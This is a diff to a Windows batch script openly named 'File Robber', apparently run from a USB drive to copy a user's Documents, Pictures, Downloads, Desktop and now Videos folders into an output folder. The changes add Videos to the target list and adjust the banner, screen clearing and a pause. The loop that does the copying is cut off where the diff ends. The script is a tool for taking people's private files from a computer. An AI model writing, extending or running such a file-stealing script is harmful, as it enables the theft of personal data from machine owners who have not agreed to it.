@@ -20,16 +20,19 @@ if not exist "%scriptdir%\%outputfolder%" (
 )
 
 REM List of source folders to copy from
-set "folders=Documents Pictures Downloads Desktop"
+set "folders=Documents Pictures Downloads Videos Desktop"
 
-echo Starting File Robber... 
+echo Starting File Robber...
+cls
 echo --------------------------------------------------------------------
 echo --------------------------------------------------------------------
-echo FILE ROBBER V1.0
+echo FILE ROBBER BETA V0.2
 echo Created by @HighSchoolProgrammer on GitHub
 echo https://github.com/HighSchoolProgrammer/USB-File-Robber
 echo --------------------------------------------------------------------
 echo --------------------------------------------------------------------
+
+timeout /t 3 
 
 REM Loop through each folder, copy files, and move them to the 'OUTPUT' folder
 for %%d in (%folders%) do (
